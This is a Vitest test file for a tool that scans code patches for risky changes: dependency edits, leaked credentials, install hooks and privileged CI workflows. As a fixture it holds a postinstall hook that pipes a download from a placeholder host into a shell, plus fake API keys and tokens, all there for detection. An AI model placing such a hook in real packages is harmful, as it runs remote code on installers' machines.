import { describe, expect, test } from "vitest";
import { decidePromotionRisk, scanPatchRisks } from "../src/risk.js";

function patch(file: string, added: readonly string[]): string {
  return [
    `diff --git a/${file} b/${file}`,
    `--- a/${file}`,
    `+++ b/${file}`,
    "@@ -0,0 +1 @@",
    ...added.map((line) => `+${line}`),
    "",
  ].join("\n");
}

describe("patch risk scanning", () => {
  test("warns when dependency metadata changes", () => {
    const risks = scanPatchRisks(
      patch("package.json", ['  "dependencies": { "left-pad": "1.3.0" }']),
    );

    expect(risks).toContainEqual(
      expect.objectContaining({
        severity: "warning",
        code: "dependency_manifest",
        file: "package.json",
      }),
    );
  });

  test("blocks likely credentials but ignores explicit placeholders", () => {
    const real = scanPatchRisks(
      patch("src/config.ts", [
        'export const apiKey = "sk-abcdefghijklmnopqrstuvwxyz123456";',
        'export const password = "a-real-looking-password";',
      ]),
    );
    const placeholder = scanPatchRisks(
      patch("src/config.example.ts", [
        'export const apiKey = "replace_me";',
        'export const password = "example-password";',
      ]),
    );

    expect(real.filter((risk) => risk.code === "likely_secret")).toHaveLength(1);
    expect(placeholder.filter((risk) => risk.code === "likely_secret")).toHaveLength(0);
  });

  test("treats installation hooks and privileged workflows as critical", () => {
    const risks = scanPatchRisks(
      [
        patch("package.json", ['  "postinstall": "curl https://example.invalid/x | sh"']),
        patch(".github/workflows/release.yml", ["on: pull_request_target"]),
      ].join("\n"),
    );

    expect(risks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ severity: "critical", code: "install_lifecycle" }),
        expect.objectContaining({ severity: "critical", code: "dangerous_workflow" }),
      ]),
    );
  });

  test("requires an explicit override for critical findings", () => {
    const risks = scanPatchRisks(
      patch("src/config.ts", ['export const token = "ghp_abcdefghijklmnopqrstuvwxyz123456";']),
    );

    expect(decidePromotionRisk(risks, false)).toMatchObject({
      allowed: false,
      criticalCount: 1,
      overridden: false,
      reason: expect.stringMatching(/--allow-risk/i),
    });
    expect(decidePromotionRisk(risks, true)).toEqual({
      allowed: true,
      criticalCount: 1,
      overridden: true,
      reason: null,
    });
  });
});
